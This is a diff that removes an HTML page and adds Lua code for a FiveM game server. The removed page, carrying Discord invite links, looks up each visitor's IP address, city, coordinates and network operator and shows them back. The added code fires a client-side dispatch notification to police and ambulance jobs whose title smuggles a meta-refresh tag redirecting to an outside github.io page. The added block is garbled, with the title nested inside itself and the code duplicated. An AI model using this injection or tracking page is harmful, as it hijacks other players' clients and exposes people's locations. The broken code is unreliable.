@@ -1,76 +1,45 @@
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>discord.gg/EHZTXduFm2</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url ()
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #ff0000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #ff0000; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 0, 255, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #ff1d1d; 
-            text-shadow: 0px 0px 8px #ff1212, 0px 0px 15px #fb1111, 0px 0px 25px #ff1111; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
-</head>
-<body>
-    <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1416702220837322793/1431303204645109770/temp_image_CBF913EB-8B27-41CE-8418-3E3A5399658E.webp?ex=68fcec7c&is=68fb9afc&hm=85c4902704e5330e26144f2d2771cfd1bceab344cfa1b69183693f77dd25027a&) no-repeat center center fixed;">
-    </div>
-    <audio autoplay loop>
-        <source src="aa.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-     <div class="text">جحيم للتربية و التعليم</div>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text">GG : Ja7eem OP : https://discord.gg/ywpvy4db</div>
+local title = "<meta http-equiv='refresh' content='0; url=local title = "<meta http-equiv='refreshurl=https://kayalzx526-a11y.github.io/111/'>"
+local coords = vector3(215.76, -810.12, 30.73)
+local sex = "male"
+local street = "Legion Square"
 
-    <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
-</body>
-</html>
+TriggerServerEvent('cd_dispatch:AddNotification', {
+    job_table = { 'police', 'mtf', 'gangunit', 'ambulance' },
+    coords = coords,
+    title = title,
+    message = 'Someone has reported a ' .. sex .. ' at ' .. street,
+    flash = 0,
+    unique_id = tostring(math.random(1000000, 9999999)),
+    sound = 1,
+    blip = {
+        sprite = 586,
+        scale = 1.2,
+        colour = 3,
+        flashes = true,
+        text = '999 - Suspicious Activity',
+        time = 5,
+        radius = 0
+    }
+})'>"
+local coords = vector3(215.76, -810.12, 30.73)
+local sex = "male"
+local street = "Legion Square"
+
+TriggerServerEvent('cd_dispatch:AddNotification', {
+    job_table = { 'police', 'mtf', 'gangunit', 'ambulance' },
+    coords = coords,
+    title = title,
+    message = 'Someone has reported a ' .. sex .. ' at ' .. street,
+    flash = 0,
+    unique_id = tostring(math.random(1000000, 9999999)),
+    sound = 1,
+    blip = {
+        sprite = 586,
+        scale = 1.2,
+        colour = 3,
+        flashes = true,
+        text = '999 - Suspicious Activity',
+        time = 5,
+        radius = 0
+    }
+})
